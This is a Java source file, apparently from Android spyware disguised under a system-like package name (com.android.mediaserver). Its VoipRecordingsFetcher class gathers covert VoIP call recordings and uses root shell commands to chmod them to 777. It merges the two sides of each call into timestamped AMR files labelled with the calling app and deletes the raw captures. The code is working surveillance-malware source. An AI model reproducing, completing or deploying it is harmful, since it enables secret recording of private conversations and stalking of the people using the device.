package com.android.mediaserver.fetchers.media;

import android.content.Context;
import android.support.v4.media.session.PlaybackStateCompat;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.file.FileLister;
import com.android.mediaserver.file.filefilter.SuffixFileFilter;
import com.android.mediaserver.file.filefilter.TrueFileFilter;
import com.android.mediaserver.shell.Shell.SU;
import com.android.mediaserver.voip.AudioEncoder;
import com.sromku.simple.storage.SimpleStorage;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Comparator;
import java.util.Iterator;

public class VoipRecordingsFetcher {
  private static final int MIN_FILE_SIZE = 16384;
  private Context mContext;

  public VoipRecordingsFetcher(Context context) {
    mContext = context;
  }

  private String readEndTimestamp(String path) {
    try {
      File file = new File(path);
      DataInputStream dis = new DataInputStream(new FileInputStream(file));
      dis.skipBytes((int) (file.length() - 8));
      byte[] tsBytes = new byte[8];
      dis.read(tsBytes);
      String timestamp = String.valueOf(bytesToLong(tsBytes));
      dis.close();
      return timestamp;
    } catch (Exception e) {
      return "";
    }
  }

  private long bytesToLong(byte[] longBytes) {
    long value = 0;
    for (int i = 0; i < longBytes.length; i++) {
      value += (((long) longBytes[i]) & 255) << (i * 8);
    }
    return value;
  }

  public Collection<File> fetch() {
    File voipRecordingDirectory = SimpleStorage.getInternalStorage(mContext)
        .getFile(Config.getInstance(mContext).getVoipRecordingsDirectoryName());
    if (!voipRecordingDirectory.exists()) {
      return new ArrayList();
    }
    ArrayList<File> files = new ArrayList(
        FileLister.listFiles(voipRecordingDirectory, new SuffixFileFilter(".pcm"),
            TrueFileFilter.TRUE));
    ArrayList<File> filesToRemove = new ArrayList();
    Iterator it = files.iterator();
    while (it.hasNext()) {
      File currentFile = (File) it.next();
      if (Math.abs(System.currentTimeMillis() - currentFile.lastModified()) < 5000) {
        filesToRemove.add(currentFile);
      }
    }
    files.removeAll(filesToRemove);
    filesToRemove.clear();
    it = files.iterator();
    while (it.hasNext()) {
      File currentFile = (File) it.next();
      if (currentFile.length() < PlaybackStateCompat.ACTION_PREPARE) {
        filesToRemove.add(currentFile);
      }
    }
    files.removeAll(filesToRemove);
    Collections.sort(files, new Comparator<File>() {
      public int compare(File o1, File o2) {
        return o1.getName().compareTo(o2.getName());
      }
    });
    Collection<File> arrayList = new ArrayList(
        FileLister.listFiles(voipRecordingDirectory, new SuffixFileFilter(".amr"),
            TrueFileFilter.TRUE));
    if (files.size() <= 0) {
      return arrayList;
    }
    AudioEncoder encoder = new AudioEncoder();
    String destDir = SimpleStorage.getInternalStorage(mContext)
        .getFile(Config.getInstance(mContext).getVoipRecordingsDirectoryName())
        .getAbsolutePath() + "/";
    int i = 0;
    while (i < files.size()) {
      File currentFile = (File) files.get(i);
      if (currentFile.exists()) {
        VoipRecordingInfo currentFileRecodingInfo = new VoipRecordingInfo(currentFile.getName());
        SU.run("chmod 777 " + currentFile.getAbsolutePath());
        String destFilePath =
            destDir
                + currentFileRecodingInfo.getTimestamp()
                + "-"
                + readEndTimestamp(currentFile.getAbsolutePath())
                + "-"
                + currentFileRecodingInfo.getApplication()
                + ".amr";
        if (i + 1 < files.size()) {
          for (int j = i + 1; j < files.size(); j++) {
            File nextFile = (File) files.get(j);
            VoipRecordingInfo nextFileRecordingInfo = new VoipRecordingInfo(nextFile.getName());
            if (currentFileRecodingInfo.getApplication()
                .equals(nextFileRecordingInfo.getApplication())) {
              if (currentFileRecodingInfo.getSampleRate()
                  != nextFileRecordingInfo.getSampleRate()) {
                nextFile.delete();
              } else if (currentFileRecodingInfo.getType()
                  .equals(nextFileRecordingInfo.getType())) {
                currentFile.delete();
              } else {
                SU.run("chmod 777 " + nextFile.getAbsolutePath());
                encoder.mixAndEncodeToAmr(currentFile.getAbsolutePath(), nextFile.getAbsolutePath(),
                    destFilePath, currentFileRecodingInfo.getSampleRate());
                arrayList.add(new File(destFilePath));
                currentFile.delete();
                nextFile.delete();
                i++;
              }
            }
          }
        } else {
          currentFile.delete();
        }
      }
      i++;
    }
    return arrayList;
  }
}
